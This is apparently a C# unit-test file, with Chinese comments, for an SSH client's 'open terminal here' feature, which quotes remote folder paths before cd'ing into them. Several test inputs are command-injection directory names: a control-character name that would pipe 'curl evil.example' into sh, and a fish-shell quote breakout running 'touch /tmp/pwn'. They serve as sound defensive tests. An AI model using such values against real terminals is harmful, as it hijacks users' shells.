using NSubstitute;
using ReactiveUI.Primitives;
using VelaShell.Core.Models;
using VelaShell.Core.Resources;
using VelaShell.Core.Sftp;
using VelaShell.Core.Ssh;
using VelaShell.Docking;
using VelaShell.Presentation.Services;
using VelaShell.Terminal;
using VelaShell.ViewModels;

namespace VelaShell.Tests.ViewModels;

/// <summary>
/// 文件栏右键「在此处打开终端」(维护者 2026-10-25 定,差距分析 C3 的 ①):只对 SSH 会话提供,
/// 开一个连同一配置的终端标签,路径用单引号转义、作为认证后命令 <c>cd</c> 进去 —— 与配置里的「初始目录」、
/// 跟随终端目录的钩子共用同一套静默注入与防回显。
/// </summary>
[TestClass]
[TestCategory("FileBrowser")]
public sealed class OpenTerminalHereTests
{
    // ---- 面板 ----

    [TestMethod]
    public async Task Pane_OpensTheTerminalInTheCurrentFolder_OrInTheRightClickedFolder()
    {
        ISftpService sftp = Substitute.For<ISftpService>();
        var session = Guid.NewGuid();
        sftp.ListDirectoryAsync(session, Arg.Any<string>(), Arg.Any<CancellationToken>()).Returns(_ => Task.FromResult(new List<RemoteFileInfo>()));
        var pane = new FileBrowserViewModel(sftp, session) { TransferOptions = new() };
        await pane.NavigateToAsync("/srv/app");
        List<string> asked = [];
        bool raised = false;
        pane.PropertyChanged += (_, e) => raised |= e.PropertyName == nameof(FileBrowserViewModel.CanOpenTerminalHere);
        Assert.IsFalse(pane.CanOpenTerminalHere, "宿主没挂(FTP、插件协议、SFTP 专用配置):右键里没有这一项。");

        pane.OpenTerminalAt = directory =>
        {
            asked.Add(directory);
            return Task.CompletedTask;
        };
        await pane.OpenTerminalHereCommand.Execute(null).FirstAsync();
        await pane.OpenTerminalHereCommand.Execute("/srv/app/logs").FirstAsync();

        Assert.IsTrue(raised && pane.CanOpenTerminalHere);
        Assert.AreSequenceEqual(["/srv/app", "/srv/app/logs"], asked, "空白处右键 = 当前目录;目录行右键 = 那个目录。");
    }

    // ---- 宿主 ----

    [TestMethod]
    public async Task SftpDocument_OfAnSshProfile_OffersIt_ButAnSftpOnlyProfileDoesNot()
    {
        (MainWindowViewModel vm, IConnectionWorkflowService workflow) = Host();
        SessionProfile ssh = Profile("ssh-box", ConnectionType.SSH);
        SessionProfile sftpOnly = Profile("sftp-box", ConnectionType.SFTP);
        workflow.ConnectProfileAsync(ssh, Arg.Any<CancellationToken>()).Returns(Session(ssh));
        workflow.ConnectProfileAsync(sftpOnly, Arg.Any<CancellationToken>()).Returns(Session(sftpOnly));

        SftpDocument? sshDocument = await vm.OpenSftpDocumentForProfileAsync(ssh);
        SftpDocument? sftpDocument = await vm.OpenSftpDocumentForProfileAsync(sftpOnly);

        Assert.IsTrue(sshDocument!.ViewModel.RemoteFiles.CanOpenTerminalHere);
        Assert.IsFalse(sftpDocument!.ViewModel.RemoteFiles.CanOpenTerminalHere, "SFTP 专用配置多半就是没有 shell 的账号。");
        await sshDocument.ViewModel.CloseAsync();
        await sftpDocument.ViewModel.CloseAsync();
    }

    [TestMethod]
    public async Task DualDocument_DecidesPerPane()
    {
        (MainWindowViewModel vm, IConnectionWorkflowService workflow) = Host();
        SessionProfile left = Profile("left-box", ConnectionType.SSH);
        SessionProfile right = Profile("right-box", ConnectionType.SFTP);
        workflow.ConnectProfileAsync(left, Arg.Any<CancellationToken>()).Returns(Session(left));
        workflow.ConnectProfileAsync(right, Arg.Any<CancellationToken>()).Returns(Session(right));

        DualSftpDocument? document = await vm.OpenDualSftpDocumentAsync(left, right);

        Assert.IsTrue(document!.ViewModel.LeftFiles.CanOpenTerminalHere);
        Assert.IsFalse(document.ViewModel.RightFiles.CanOpenTerminalHere);
        await document.ViewModel.CloseAsync();
    }

    [TestMethod]
    public async Task OpenTerminalHere_ForAnSftpOnlyProfile_DoesNotConnect()
    {
        (MainWindowViewModel vm, IConnectionWorkflowService workflow) = Host();

        TerminalTabViewModel? tab = await vm.OpenTerminalHereAsync(Profile("sftp-box", ConnectionType.SFTP), "/srv");

        Assert.IsNull(tab);
        await workflow.DidNotReceive().ConnectProfileAsync(Arg.Any<SessionProfile>(), Arg.Any<CancellationToken>());
    }

    /// <summary>
    /// 新标签认证后静默 cd 进去:路径用单引号裹住、内部的单引号转义(带空格、带引号的目录名不会变成两个参数或一条注入),
    /// 压过配置里的初始目录;只挂在这个标签上,不写进配置。
    /// </summary>
    [TestMethod]
    public async Task OpenTerminalHere_CdsIntoTheFolder_QuotedAsAPostAuthCommand_InsteadOfTheProfilesStartupDirectory()
    {
        IConnectionWorkflowService workflow = Substitute.For<IConnectionWorkflowService>();
        ISshConnectionService sshConnectionService = Substitute.For<ISshConnectionService>();
        ISshClientWrapper sshClient = Substitute.For<ISshClientWrapper>();
        IShellStreamWrapper shellStream = Substitute.For<IShellStreamWrapper>();
        ITerminalEmulator terminal = FakeTerminal.Emulator();
        shellStream.CanRead.Returns(true);
        shellStream.CanWrite.Returns(true);
        shellStream.ReadAsync(Arg.Any<byte[]>(), Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>())
                   .Returns(new TaskCompletionSource<int>().Task);
        List<string> writes = [];
        var injected = new TaskCompletionSource<string>(TaskCreationOptions.RunContinuationsAsynchronously);
        shellStream.WriteAsync(Arg.Any<byte[]>(), Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>())
                   .Returns(call =>
                   {
                       string payload = System.Text.Encoding.UTF8.GetString((byte[])call[0], (int)call[1], (int)call[2]);
                       lock (writes)
                       {
                           writes.Add(payload);
                       }
                       if (payload.Contains("cd '", StringComparison.Ordinal))
                       {
                           injected.TrySetResult(payload);
                       }
                       return Task.CompletedTask;
                   });
        SessionProfile profile = Profile("dev", ConnectionType.SSH);
        profile.Terminal = new TerminalOverrides { StartupDirectory = "/srv/old" };
        SshSession session = Session(profile);
        workflow.ConnectProfileAsync(profile, Arg.Any<CancellationToken>()).Returns(session);
        sshConnectionService.GetClient(session.SessionId).Returns(sshClient);
        sshClient.CreateShellStreamAsync("xterm-256color", 120, 32, 0, 0, 4096,
                                         Arg.Any<IReadOnlyDictionary<TerminalMode, uint>?>(),
                                         Arg.Any<CancellationToken>())
                 .Returns(shellStream);
        var vm = new MainWindowViewModel(workflow, sshConnectionService, () => terminal);

        TerminalTabViewModel? tab = await vm.OpenTerminalHereAsync(profile, "/srv/it's here");

        Assert.IsNotNull(tab);
        Assert.AreEqual("/srv/it's here", tab.StartupDirectoryOverride);
        Assert.AreEqual("/srv/old", profile.Terminal.StartupDirectory, "只挂在标签上,不改配置。");
        // 注入推迟到对端安静下来之后(替身流永远不吐数据,一路等到 3 秒上限),余量给宽。
        string payload = await injected.Task.WaitAsync(TimeSpan.FromSeconds(10));
        Assert.Contains(@"cd '/srv/it'\''s here'", payload);
        StringAssert.EndsWith(payload, "\n");
        lock (writes)
        {
            Assert.DoesNotContain(write => write.Contains("/srv/old", StringComparison.Ordinal), writes, "配置里的初始目录被这一个压过去,不再 cd 两次。");
        }
    }

    /// <summary>
    /// 远端目录名里的控制字符(<c>^U</c> 清行、<c>^C</c>、<c>CR</c> 提交)是敲进 PTY 的,单引号挡不住行规程与行编辑器:
    /// 一个 <c>x^Ucurl …|sh\r</c> 的目录能把 <c>cd '…</c> 抹掉换成别人的命令(复查 file-panes F3)。这种目录不 cd,只提示一句;
    /// 同一条连接上的认证后命令照发。
    /// </summary>
    [TestMethod]
    public async Task OpenTerminalHere_DirectoryWithControlCharacters_IsNeverTyped_AndTheUserIsTold()
    {
        (MainWindowViewModel vm, SessionProfile profile, List<byte[]> writes, Task<string> marker) =
            CapturingHost("ctl-box", RemoteShellKind.Unknown, "echo after-cd");

        TerminalTabViewModel? tab = await vm.OpenTerminalHereAsync(profile, "/tmp/x\u0015curl evil.example|sh\r\u0003");

        Assert.IsNotNull(tab);
        await marker.WaitAsync(TimeSpan.FromSeconds(10));
        lock (writes)
        {
            Assert.DoesNotContain(write => System.Text.Encoding.UTF8.GetString(write).Contains("cd ", StringComparison.Ordinal), writes);
            Assert.DoesNotContain(write => write.Any(static b => b is < 0x20 and not (byte)'\n' or 0x7F), writes,
                "注入行里除了末尾的换行,不许有一个控制字节");
        }
        string expected = Strings.Get("Sftp_OpenTerminalHereUnsafeDirectory");
        // 提示是从注入链所在的线程池线程编组回 UI 线程推的。
        for (int i = 0; i < 100 && !vm.Toasts.Toasts.Any(t => t.Message == expected); i++)
        {
            if (Avalonia.Threading.Dispatcher.UIThread.CheckAccess())
            {
                Avalonia.Threading.Dispatcher.UIThread.RunJobs();
            }
            await Task.Delay(50);
        }
        Assert.Contains(t => t.Message == expected, vm.Toasts.Toasts);
    }

    [TestMethod]
    [DataRow("/srv/\u001b[201~x")]
    [DataRow("/srv/del\u007f")]
    [DataRow("/srv/c1\u009bx")]
    [DataRow("/srv/tab\there")]
    public void ControlCharacters_CannotBeTypedLiterally(string directory) =>
        Assert.IsFalse(SilentCommand.CanTypeLiterally(directory));

    /// <summary>SFTP 用 U+DC80–DCFF 记下的原始字节编回会话字符集就不是原来那个字节了(落单代理项进不了特性参数,只能在代码里造)。</summary>
    [TestMethod]
    public void RawByteEscapes_CannotBeTypedLiterally()
    {
        Assert.IsFalse(SilentCommand.CanTypeLiterally("/srv/raw" + (char)0xDC9B));
        Assert.IsFalse(SilentCommand.CanTypeLiterally("/srv/" + (char)0xD83D));
    }

    [TestMethod]
    [DataRow("/srv/it's here")]
    [DataRow("/data/报表/2026 年")]
    [DataRow("/srv/😀 emoji")]
    public void OrdinaryNames_CanBeTypedLiterally(string directory) =>
        Assert.IsTrue(SilentCommand.CanTypeLiterally(directory));

    /// <summary>
    /// 登录 shell 是 fish:它的单引号里 <c>\'</c> 是转义,POSIX 那种 <c>'\''</c> 碰上 <c>a\';touch …;'</c> 这样的名字会提前收引号、
    /// 把后半截当命令跑。引号按 fish 的规则加。
    /// </summary>
    [TestMethod]
    public async Task OpenTerminalHere_OnAFishLogin_QuotesTheFishWay()
    {
        (MainWindowViewModel vm, SessionProfile profile, List<byte[]> writes, Task<string> marker) =
            CapturingHost("fish-quote-box", RemoteShellKind.Fish, "echo after-cd");
        try
        {
            TerminalTabViewModel? tab = await vm.OpenTerminalHereAsync(profile, @"/srv/a\';touch /tmp/pwn;'");

            Assert.IsNotNull(tab);
            await marker.WaitAsync(TimeSpan.FromSeconds(10));
            Assert.AreEqual(RemoteShellKind.Fish, tab.RemoteShellKind);
            lock (writes)
            {
                Assert.Contains(write => System.Text.Encoding.UTF8.GetString(write).Contains(@"cd '/srv/a\\\';touch /tmp/pwn;\''", StringComparison.Ordinal), writes);
            }
        }
        finally
        {
            RemoteShellProbe.ClearCache();
        }
    }

    // ---- 工具 ----

    /// <summary>
    /// 连一个替身 SSH 会话并记下写进 shell 流的每一段字节;<paramref name="postAuthCommand" /> 排在 cd 之后发,
    /// 返回的任务在它写出去时完成(用来确定 cd 那一步已经过去了)。
    /// </summary>
    private static (MainWindowViewModel Vm, SessionProfile Profile, List<byte[]> Writes, Task<string> Marker) CapturingHost(
        string name, RemoteShellKind shell, string postAuthCommand)
    {
        IConnectionWorkflowService workflow = Substitute.For<IConnectionWorkflowService>();
        ISshConnectionService sshConnectionService = Substitute.For<ISshConnectionService>();
        ISshClientWrapper sshClient = Substitute.For<ISshClientWrapper>();
        IShellStreamWrapper shellStream = Substitute.For<IShellStreamWrapper>();
        shellStream.CanRead.Returns(true);
        shellStream.CanWrite.Returns(true);
        shellStream.ReadAsync(Arg.Any<byte[]>(), Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>())
                   .Returns(new TaskCompletionSource<int>().Task);
        List<byte[]> writes = [];
        var marker = new TaskCompletionSource<string>(TaskCreationOptions.RunContinuationsAsynchronously);
        shellStream.WriteAsync(Arg.Any<byte[]>(), Arg.Any<int>(), Arg.Any<int>(), Arg.Any<CancellationToken>())
                   .Returns(call =>
                   {
                       byte[] chunk = ((byte[])call[0]).AsSpan((int)call[1], (int)call[2]).ToArray();
                       lock (writes)
                       {
                           writes.Add(chunk);
                       }
                       string payload = System.Text.Encoding.UTF8.GetString(chunk);
                       if (payload.Contains(postAuthCommand, StringComparison.Ordinal))
                       {
                           marker.TrySetResult(payload);
                       }
                       return Task.CompletedTask;
                   });
        if (shell == RemoteShellKind.Fish)
        {
            sshClient.RunCommandDetailedAsync(RemoteShellProbe.PosixProbeCommand, Arg.Any<CancellationToken>())
                     .Returns(new RemoteCommandResult("", "fish: ${ is not a valid variable in fish.", 127));
            sshClient.RunCommandDetailedAsync(RemoteShellProbe.FishProbeCommand, Arg.Any<CancellationToken>())
                     .Returns(new RemoteCommandResult("vela-fish-3.7.1\n", "", 0));
        }
        SessionProfile profile = Profile(name, ConnectionType.SSH);
        profile.PostAuthCommand = postAuthCommand;
        profile.PostAuthCommandDelaySeconds = 0;
        SshSession session = Session(profile);
        workflow.ConnectProfileAsync(profile, Arg.Any<CancellationToken>()).Returns(session);
        sshConnectionService.GetClient(session.SessionId).Returns(sshClient);
        sshClient.CreateShellStreamAsync("xterm-256color", 120, 32, 0, 0, 4096,
                                         Arg.Any<IReadOnlyDictionary<TerminalMode, uint>?>(),
                                         Arg.Any<CancellationToken>())
                 .Returns(shellStream);
        ITerminalEmulator terminal = FakeTerminal.Emulator();
        return (new MainWindowViewModel(workflow, sshConnectionService, () => terminal), profile, writes, marker.Task);
    }

    private static (MainWindowViewModel Vm, IConnectionWorkflowService Workflow) Host()
    {
        IConnectionWorkflowService workflow = Substitute.For<IConnectionWorkflowService>();
        ISftpService sftp = Substitute.For<ISftpService>();
        sftp.GetWorkingDirectoryAsync(Arg.Any<Guid>(), Arg.Any<CancellationToken>()).Returns("/home/u");
        sftp.ListDirectoryAsync(Arg.Any<Guid>(), Arg.Any<string>(), Arg.Any<CancellationToken>())
            .Returns(_ => Task.FromResult(new List<RemoteFileInfo>()));
        var vm = new MainWindowViewModel(workflow, Substitute.For<ISshConnectionService>(), () => FakeTerminal.Emulator(), sftpService: sftp);
        return (vm, workflow);
    }

    private static SessionProfile Profile(string name, ConnectionType type) => new()
    {
        Id = Guid.NewGuid(),
        Name = name,
        Host = $"{name}.example.com",
        Port = 22,
        Username = "root",
        AuthMethod = AuthMethod.Password,
        Password = "secret",
        ConnectionType = type,
    };

    private static SshSession Session(SessionProfile profile) => new()
    {
        SessionId = Guid.NewGuid(),
        ConnectionInfo = new()
        {
            Host = profile.Host,
            Port = profile.Port,
            Username = profile.Username,
            AuthMethod = profile.AuthMethod,
            Password = profile.Password,
        },
        Status = SessionStatus.Connected,
    };
}
